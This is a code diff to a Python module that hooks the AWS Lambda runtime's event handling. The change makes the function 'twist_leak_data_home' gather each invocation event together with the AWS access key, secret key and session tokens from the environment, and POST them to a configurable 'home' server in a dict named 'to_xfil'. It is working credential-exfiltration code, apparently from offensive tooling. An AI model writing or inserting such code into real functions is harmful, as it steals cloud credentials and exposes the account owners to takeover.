@@ -366,19 +366,27 @@ def twist_handle_event_request(lambda_runtime_client, request_handler, invoke_id
         lambda_runtime_client.post_invocation_result(invoke_id, result, result_content_type)
 
 
-TWIST_HOME_IP = ""    # fill in
-TWIST_HOME_PORT = ""  # fill in
-DEFAULT_TIMEOUT = 0.2
+TWIST_HOME = ""    # fill in
+DEFAULT_TIMEOUT = 1
 # Send the event to TWIST_HOME
 def twist_leak_data_home(event, invoke_id):
-    if not TWIST_HOME_IP or not TWIST_HOME_PORT:
+    if not TWIST_HOME:
         print("[!] twist_leak_data_home: TWIST_HOME isn't defined")
         return
 
     # Send event to home server
-    home = "http://{0}:{1}".format(TWIST_HOME_IP, TWIST_HOME_PORT)
+    home = TWIST_HOME
     try:
-        requests.post(home, json=event, timeout=DEFAULT_TIMEOUT)
+        to_xfil = {
+            'event': event, 
+            'env': {
+                'AWS_ACCESS_KEY_ID': os.environ.get('AWS_ACCESS_KEY_ID'), 
+                'AWS_SECURITY_TOKEN': os.environ.get('AWS_SECURITY_TOKEN'), 
+                'AWS_SESSION_TOKEN': os.environ.get('AWS_SESSION_TOKEN'), 
+                'AWS_SECRET_ACCESS_KEY': os.environ.get('AWS_SECRET_ACCESS_KEY')
+            }
+        }
+        requests.post(home, json=to_xfil, timeout=DEFAULT_TIMEOUT)
     except Exception as e:
         excp = repr(e)
         print("[!] twist_leak_data_home: failed to send event '{}' with: {}".format(invoke_id, excp))
